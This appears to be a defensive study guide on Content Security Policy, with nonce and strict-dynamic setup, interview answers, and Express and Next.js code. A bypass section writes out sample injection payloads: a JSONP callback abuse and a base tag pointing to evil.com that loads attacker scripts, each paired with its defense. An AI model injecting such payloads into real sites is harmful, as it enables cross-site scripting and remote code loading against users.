1. What is CSP?

// CSP = whitelist of approved content sources for your page
// Browser enforces: only load scripts/styles/images from approved origins
// Primary defense against XSS (even if attacker injects HTML,
//   the browser blocks the injected script from executing)
//
// Delivered as HTTP header (preferred) or <meta> tag
//
// Without CSP: <script>alert('xss')</script> → executes
// With CSP (strict): inline scripts blocked → XSS mitigated
//
// CSP also prevents:
// - Data exfiltration (restrict connect-src)
// - Clickjacking (frame-ancestors)
// - Mixed content (upgrade-insecure-requests)
// - Base tag hijacking (base-uri 'self')

3. Nonce-Based CSP (Recommended)

// Server generates a unique random nonce per request
// Only scripts/styles with matching nonce attribute are allowed

// HTTP response header:
Content-Security-Policy: script-src 'nonce-abc123random' 'strict-dynamic'

// HTML:
<script nonce="abc123random">
  // This script runs — nonce matches
  app.init();
</script>

<script>
  // This script is BLOCKED — no matching nonce
  alert("xss");
</script>

// 'strict-dynamic': scripts loaded by nonced scripts are also trusted
// → Your bundled app.js (nonced) can dynamically import chunks
// → But injected scripts can't load their own scripts
//
// Nonce MUST be:
// - Cryptographically random (min 128 bits)
// - Generated per request (never reuse)
// - Unpredictable by attacker

CSP Bypass Techniques & Defenses

1. JSONP Endpoint Bypass

// If script-src allows a CDN that hosts JSONP endpoints:
// script-src 'self' https://cdn.google.com
//
// Attacker injects: <script src="https://cdn.google.com/jsonp?callback=alert">
// Google JSONP returns: alert({data}) → executes with attacker's payload
//
// Defense: Use nonces instead of domain whitelists
// With nonces, even whitelisted domains need the correct nonce

2. Base Tag Hijacking

// If base-uri isn't restricted:
// Attacker injects: <base href="https://evil.com/">
// All relative URLs now resolve to evil.com
// <script src="/app.js"> → loads https://evil.com/app.js
//
// Defense: base-uri 'self' (or 'none')

3. unsafe-inline Is Unsafe

// script-src 'unsafe-inline' → permits ALL inline scripts
// This completely defeats the purpose of CSP for XSS
// Any injected <script>alert('xss')</script> will execute
//
// Fix: Replace 'unsafe-inline' with nonces
// For styles: nonces are preferred, 'unsafe-inline' is acceptable
//   (CSS-based attacks are limited compared to script injection)

FAANG Interview Questions

Q1: Explain CSP and how you'd implement it for a React SPA.
CSP is a browser security mechanism that restricts which resources a page can load. You set it via an HTTP header with directives like script-src (allowed JS sources), connect-src (allowed API endpoints), img-src, etc. For a React SPA: I'd use nonce-based CSP. The server generates a random nonce per request and injects it into both the CSP header and the script tags. With 'strict-dynamic', the bundled entry script (which has the nonce) can load dynamic chunks without each needing a nonce. Typical policy: default-src 'self'; script-src 'nonce-{random}' 'strict-dynamic'; style-src 'self' 'nonce-{random}'; connect-src 'self' https://api.example.com; img-src 'self' data: https://cdn.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'. Deploy in report-only mode first (Content-Security-Policy-Report-Only) to catch violations without breaking the app, review reports, then enforce. The challenge with React: styled-components or CSS-in-JS inject inline styles — either use nonces or configure the library to support CSP.
Follow-up: How do you handle third-party scripts (analytics, ads) with strict CSP?
Q2: What's the difference between 'strict-dynamic' and domain whitelisting?
Domain whitelisting (script-src https://cdn.com) trusts all scripts from that domain. Problem: if the CDN hosts any JSONP endpoint or user-uploaded content, an attacker can exploit that to bypass CSP entirely. Research has shown that 94% of CSP policies using domain whitelisting can be bypassed. 'strict-dynamic' changes the trust model: instead of trusting domains, trust is propagated from explicitly-trusted scripts. If a script with a valid nonce creates another script element (via createElement), the child script is automatically trusted regardless of its source. But a script injected via innerHTML (typical XSS) does NOT get this trust propagation. This means: your webpack bundle (nonced) can lazy-load chunks, but an XSS payload in innerHTML can't load its own scripts. The combination of nonce + strict-dynamic is Google's recommended "strict CSP" approach.
Follow-up: Does strict-dynamic work with module scripts (type="module")?
Q3: How do you deploy CSP without breaking an existing application?
Phased rollout: (1) Audit: use browser DevTools or a CSP generator to identify all current resource sources. (2) Report-Only mode: set Content-Security-Policy-Report-Only header with your intended policy + report-uri directive. The browser logs violations without blocking anything. (3) Collect reports: set up an endpoint (or use report-uri.com) to aggregate violation reports. Run for 1-2 weeks to catch all legitimate resource loads. (4) Refine: add missing sources to the policy, replace unsafe-inline with nonces, address any inline event handlers (onclick → addEventListener). (5) Enforce: switch to Content-Security-Policy (enforcing). Keep report-uri active. (6) Iterate: as features change, violation reports alert you to policy gaps. Key tip: handle CSS-in-JS libraries early — styled-components/emotion need nonce support configured. Also handle third-party scripts (analytics, chat widgets) — they often need connect-src and img-src additions.
Follow-up: How do you handle CSP with server-side rendering and inline hydration scripts?

1. Express CSP with Nonces

import crypto from 'crypto';

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  res.setHeader('Content-Security-Policy', [
    `default-src 'self'`,
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `connect-src 'self' https://api.example.com`,
    `img-src 'self' data: https://cdn.example.com`,
    `font-src 'self' https://fonts.gstatic.com`,
    `frame-ancestors 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
  ].join('; '));
  next();
});

// In HTML template (EJS/Handlebars/etc.):
// <script nonce="<%= nonce %>" src="/app.js"></script>

2. Next.js CSP Configuration

// middleware.ts — generates nonce per request
import { NextResponse } from 'next/server';

export function middleware(request) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const csp = [
    `default-src 'self'`,
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `frame-ancestors 'none'`,
  ].join('; ');

  const headers = new Headers(request.headers);
  headers.set('x-nonce', nonce);

  const response = NextResponse.next({ request: { headers } });
  response.headers.set('Content-Security-Policy', csp);
  return response;
}

Google's Recommended Strict CSP

Content-Security-Policy:
  script-src 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'self';

// That's it. Three directives.
// 'strict-dynamic' ignores domain whitelists → trust propagation only
// object-src 'none' → blocks Flash/Java plugins
// base-uri 'self' → prevents base tag hijacking
// default-src not needed when using strict-dynamic

CSP Deployment Checklist

✅ Start with Content-Security-Policy-Report-Only (don't break things)
✅ Collect violation reports for 1-2 weeks
✅ Use nonces instead of 'unsafe-inline' for scripts
✅ Add 'strict-dynamic' for dynamic script loading
✅ Set object-src 'none' (block plugins)
✅ Set base-uri 'self' (prevent base tag hijacking)
✅ Set frame-ancestors 'none' (clickjacking)
✅ Whitelist specific APIs in connect-src
✅ Configure CSS-in-JS libraries for nonce support
✅ Handle inline event handlers (move to addEventListener)
✅ Switch to enforcing mode after validating reports
✅ Keep report-uri active for ongoing monitoring
✅ Test in all browsers (CSP support varies slightly)
